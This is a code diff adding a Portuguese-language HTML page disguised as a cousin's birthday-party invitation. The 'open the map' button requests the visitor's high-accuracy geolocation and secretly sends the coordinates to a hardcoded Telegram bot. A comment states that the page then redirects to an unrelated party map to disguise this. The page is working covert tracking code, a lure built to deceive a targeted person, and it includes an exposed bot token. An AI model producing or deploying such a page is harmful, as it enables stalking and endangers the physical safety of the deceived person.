@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convite de Aniversário</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #fce4ec; padding: 50px; }
+        .invite-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h1 { color: #d81b60; }
+        button { background-color: #d81b60; color: white; border: none; padding: 15px 25px; border-radius: 30px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="invite-card">
+    <h1>Festa do Primo! 🎂</h1>
+    <p>Estamos organizando uma surpresa e contamos com você.</p>
+    <p>Clique no botão abaixo para abrir o mapa com o local exato da festa.</p>
+    
+    <button onclick="obterLocalizacao()">ABRIR LOCAL NO MAPA</button>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = 8265613312:AAEdl5JjZKQcJ79QtgdMchlH9u1X0K3HgQE;
+    const CHAT_ID = 5881884284;
+
+    function obterLocalizacao() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sucesso, erro, {enableHighAccuracy: true});
+        } else {
+            alert("Erro ao carregar mapa.");
+        }
+    }
+
+    function sucesso(posicao) {
+        const lat = posicao.coords.latitude;
+        const lon = posicao.coords.longitude;
+        const precisao = posicao.coords.accuracy;
+        const mapaUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const mensagem = `📍 LOCALIZAÇÃO ENCONTRADA!\n\nCoordenadas: ${lat}, ${lon}\nPrecisão: ${precisao} metros\nLink: ${mapaUrl}`;
+
+        // Envia para o seu Telegram
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensagem)}`)
+        .then(() => {
+            // Redireciona para um mapa de uma festa qualquer para disfarçar
+            window.location.href = "https://goo.gl/maps/q79fH6Yf6mXU2"; 
+        });
+    }
+
+    function erro() {
+        alert("Para visualizar o local da festa, você precisa permitir o acesso à localização no navegador.");
+    }
+</script>
+
+</body>
+</html>
